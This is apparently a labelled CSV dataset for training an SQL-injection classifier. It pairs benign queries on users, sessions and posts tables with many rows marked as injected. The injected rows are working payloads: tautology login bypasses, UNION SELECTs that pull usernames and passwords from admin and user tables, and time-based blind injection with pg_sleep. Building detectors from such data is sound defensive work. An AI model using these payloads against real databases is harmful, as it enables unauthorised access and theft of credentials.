text,label
SELECT * FROM posts WHERE id = 11 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
DELETE FROM posts WHERE id = 52,0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT * FROM users WHERE username = 'user14' UNION SELECT username, password FROM admins --",1
SELECT salt FROM users WHERE username = 'user5',0
SELECT * FROM posts WHERE id = 29 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT * FROM users WHERE username = 'user19' UNION SELECT username, password FROM admins --",1
DELETE FROM posts WHERE id = 92,0
SELECT * FROM users WHERE username = 'user82' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT user_id FROM sessions WHERE session_id = 'sess_74233' AND expire_date > NOW(),0
SELECT user_id FROM sessions WHERE session_id = 'sess_50179' AND expire_date > NOW(),0
SELECT * FROM posts WHERE id = 27 OR '1'='1' --,1
SELECT * FROM posts WHERE id = 74 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = 'sess_93605' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 48 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title340' IS NULL OR title LIKE '%title340%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT user_id FROM sessions WHERE session_id = 'sess_95444' AND expire_date > NOW(),0
SELECT * FROM posts WHERE id = 39,0
SELECT user_id FROM sessions WHERE session_id = 'sess_44899' AND expire_date > NOW(),0
SELECT * FROM sessions WHERE session_id = 'sess_89031' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user31' AND password = 'pass31',0
SELECT user_id FROM sessions WHERE session_id = 'sess_37573' AND expire_date > NOW(),0
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass89',1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title749' IS NULL OR title LIKE '%title749%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title810' IS NULL OR title LIKE '%title810%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM sessions WHERE session_id = 'sess_75959' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM sessions WHERE session_id = 'sess_64047' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT salt FROM users WHERE username = 'user70',0
SELECT * FROM users WHERE username = 'user14' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user43' AND password = 'pass43',0
DELETE FROM posts WHERE id = 63,0
"SELECT * FROM users WHERE username = 'user85' UNION SELECT username, password FROM admins --",1
SELECT * FROM posts WHERE id = 6 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 52 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user50' AND password = 'pass50',0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title938' IS NULL OR title LIKE '%title938%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT salt FROM users WHERE username = 'user32',0
SELECT * FROM posts WHERE id = 80 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM sessions WHERE session_id = 'sess_61278' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT salt FROM users WHERE username = 'user39',0
SELECT * FROM posts WHERE id = 4,0
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass2',1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass16',1
DELETE FROM posts WHERE id = 58,0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title883' IS NULL OR title LIKE '%title883%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT salt FROM users WHERE username = 'user44',0
SELECT * FROM users WHERE username = 'user62' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass19',1
SELECT * FROM posts WHERE id = 6,0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM posts WHERE id = 100,0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title962' IS NULL OR title LIKE '%title962%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title96' IS NULL OR title LIKE '%title96%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM users WHERE username = 'user74' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user75' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass50',1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM posts WHERE id = 33,0
DELETE FROM posts WHERE id = 13,0
DELETE FROM posts WHERE id = 12,0
"SELECT id FROM sessions WHERE session_id = 'sess_64583' UNION SELECT id, role FROM admins --",1
SELECT * FROM posts WHERE id = 100 OR '1'='1' --,1
DELETE FROM posts WHERE id = 42,0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title167' IS NULL OR title LIKE '%title167%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
"SELECT id FROM sessions WHERE session_id = 'sess_28890' UNION SELECT id, role FROM admins --",1
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass58',1
"SELECT id FROM sessions WHERE session_id = 'sess_38598' UNION SELECT id, role FROM admins --",1
SELECT * FROM posts WHERE id = 24,0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE username = 'user55' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT salt FROM users WHERE username = 'user43',0
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title670' IS NULL OR title LIKE '%title670%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title655' IS NULL OR title LIKE '%title655%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title113' IS NULL OR title LIKE '%title113%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT user_id FROM sessions WHERE session_id = 'sess_3382' AND expire_date > NOW(),0
"SELECT * FROM users WHERE username = 'user76' UNION SELECT username, password FROM admins --",1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT user_id FROM sessions WHERE session_id = 'sess_24118' AND expire_date > NOW(),0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT salt FROM users WHERE username = 'user85',0
SELECT * FROM sessions WHERE session_id = 'sess_12210' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 33,0
SELECT * FROM posts WHERE id = 33 OR '1'='1' --,1
DELETE FROM posts WHERE id = 52,0
SELECT salt FROM users WHERE username = 'user50',0
SELECT * FROM sessions WHERE session_id = 'sess_74966' AND (SELECT CASE WHEN (expire_date > NOW()) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 2 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT user_id FROM sessions WHERE session_id = 'sess_54970' AND expire_date > NOW(),0
SELECT * FROM users WHERE username = 'user88' AND password = 'pass88',0
SELECT * FROM users WHERE username = 'user22' AND password = 'pass22',0
SELECT * FROM posts WHERE id = 85,0
DELETE FROM posts WHERE id = 2,0
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass20',1
"SELECT * FROM users WHERE username = 'user17' UNION SELECT username, password FROM admins --",1
"SELECT * FROM users WHERE username = 'user90' UNION SELECT username, password FROM admins --",1
SELECT * FROM users WHERE username = 'user75' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT user_id FROM sessions WHERE session_id = 'sess_78598' AND expire_date > NOW(),0
SELECT salt FROM users WHERE username = 'user81',0
SELECT * FROM posts WHERE id = 33 OR '1'='1' --,1
SELECT salt FROM users WHERE username = 'user76',0
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass87',1
"SELECT * FROM users WHERE username = 'user15' UNION SELECT username, password FROM admins --",1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM sessions WHERE session_id = '' OR '1'='1' -- AND expire_date > NOW(),1
SELECT user_id FROM sessions WHERE session_id = 'sess_13138' AND expire_date > NOW(),0
SELECT user_id FROM sessions WHERE session_id = 'sess_10974' AND expire_date > NOW(),0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title936' IS NULL OR title LIKE '%title936%')
         AND ('sports' IS NULL OR category_name = 'sports')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
DELETE FROM posts WHERE id = 42,0
SELECT user_id FROM sessions WHERE session_id = 'sess_41670' AND expire_date > NOW(),0
SELECT * FROM users WHERE username = 'user59' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user36' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
DELETE FROM posts WHERE id = 67,0
SELECT * FROM posts WHERE id = 52 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM posts WHERE id = 34 OR '1'='1' --,1
DELETE FROM posts WHERE id = 48,0
"SELECT * FROM users WHERE username = 'user63' UNION SELECT username, password FROM admins --",1
SELECT * FROM posts WHERE id = 16,0
DELETE FROM posts WHERE id = 24,0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title532' IS NULL OR title LIKE '%title532%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
"SELECT * FROM users WHERE username = 'user34' UNION SELECT username, password FROM admins --",1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title318' IS NULL OR title LIKE '%title318%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT salt FROM users WHERE username = 'user96',0
SELECT salt FROM users WHERE username = 'user72',0
SELECT * FROM users WHERE username = 'user22' AND password = 'pass22',0
SELECT * FROM users WHERE username = 'user6' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
"SELECT id FROM sessions WHERE session_id = 'sess_33174' UNION SELECT id, role FROM admins --",1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title614' IS NULL OR title LIKE '%title614%')
         AND ('None' IS NULL OR category_name = 'None')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT * FROM posts WHERE id = 69,0
SELECT * FROM posts WHERE id = 55,0
"SELECT * FROM users WHERE username = 'user27' UNION SELECT username, password FROM admins --",1
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title704' IS NULL OR title LIKE '%title704%')
         AND ('news' IS NULL OR category_name = 'news')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
SELECT user_id FROM sessions WHERE session_id = 'sess_94431' AND expire_date > NOW(),0
SELECT * FROM users WHERE username = 'user99' AND password = 'pass99',0
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = 'pass70',1
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM posts WHERE id = 69,0
SELECT salt FROM users WHERE username = 'user41',0
SELECT salt FROM users WHERE username = 'user45',0
SELECT user_id FROM sessions WHERE session_id = 'sess_85800' AND expire_date > NOW(),0
SELECT * FROM posts WHERE id = 2,0
SELECT * FROM users WHERE username = 'user7' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END),1
SELECT * FROM users WHERE username = 'user39' AND password = 'pass39',0
SELECT salt FROM users WHERE username = 'user73',0
SELECT * FROM posts WHERE id = 71,0
"SELECT title, content FROM posts UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE username = 'user87' AND password = 'pass87',0
"SELECT title, content, creation_date, category_name, id
       FROM posts
       WHERE 1=1
         AND ('title137' IS NULL OR title LIKE '%title137%')
         AND ('tech' IS NULL OR category_name = 'tech')
         AND ('2023-01-01' IS NULL OR creation_date >= '2023-01-01')
         AND ('2023-12-31' IS NULL OR creation_date <= '2023-12-31')",0
